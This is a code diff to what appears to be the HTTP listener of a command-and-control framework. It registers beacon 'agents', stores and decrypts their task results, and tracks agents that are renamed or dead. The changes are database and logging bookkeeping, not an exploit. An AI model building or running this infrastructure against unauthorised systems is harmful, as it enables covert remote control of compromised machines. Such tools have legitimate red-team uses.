@@ -47,14 +47,15 @@ class HTTP_listener:
             beacon_hostname = request.form.get('name')
             beacon_type = request.form.get('type')
 
-            success(f'New undercover agent {beacon_name}.')
-            fields = (beacon_name, self.name, beacon_ip, beacon_hostname, beacon_type, self.key)
+            # success(f'New undercover agent {beacon_name}.')
+            fields = (beacon_name, self.name, beacon_ip, beacon_hostname, beacon_type, self.key, True)
             self.stash.sql_stash( '''INSERT INTO agents( agent_name, \
                                                          listener_name, \
                                                          remote_ip, \
                                                          hostname, \
                                                          beacon_type, \
-                                                         enc_key ) VALUES( ?, ?, ?, ?, ?, ? )''', fields )
+                                                         enc_key, \
+                                                         alive ) VALUES( ?, ?, ?, ?, ?, ?, ? )''', fields )
             return (beacon_name, 200)
 
         @self.app.route('/tasks/<name>', methods=['GET'])
@@ -75,9 +76,16 @@ class HTTP_listener:
             if self.stash.check_code(code):
                 enc_result = request.form.get('result')
                 result = DECRYPT(enc_result, self.key)
-                success(f'Beacon name: {name} - Results to task {code} -> {result}')
+                # success(f'Beacon name: {name} - Results to task {code} -> {result}')
                 # self.stash.sql_stash( '''INSERT INTO commands_history(output) VALUES( ? ) WHERE command_code = ? ;''', (result, code) )
                 self.stash.sql_stash( '''UPDATE commands_history SET output = ? WHERE command_code = ? ;''', (result, code) )
+                if 'VALID agent renamed to ' in result:
+                    agent_name = result.split()[-1]
+                    old_name = self.stash.get_agent_from_comm(code)
+                    self.stash.sql_stash( '''UPDATE agents SET agent_name = ? WHERE agent_name = ? ;''', (agent_name, old_name) )
+                elif 'VALID agent dead' in result:
+                    agent_name = result.split()[-1]
+                    self.stash.sql_stash( '''UPDATE agents SET alive = ? WHERE agent_name = ? ;''', (False, agent_name) )
                 return ('', 204)
             else:
                 error(f'Command Code {code} not found!')
@@ -98,7 +106,7 @@ class HTTP_listener:
     def run(self):
         # to fix (debug False and logger True)
         self.app.logger.disabled = True
-        self.app.run(port=self.port, host=self.ip, debug=True)
+        self.app.run(port=self.port, host=self.ip, debug=False)
 
     def start(self):
         self.server = Process(name = self.name, target=self.run, args = (), daemon = True)
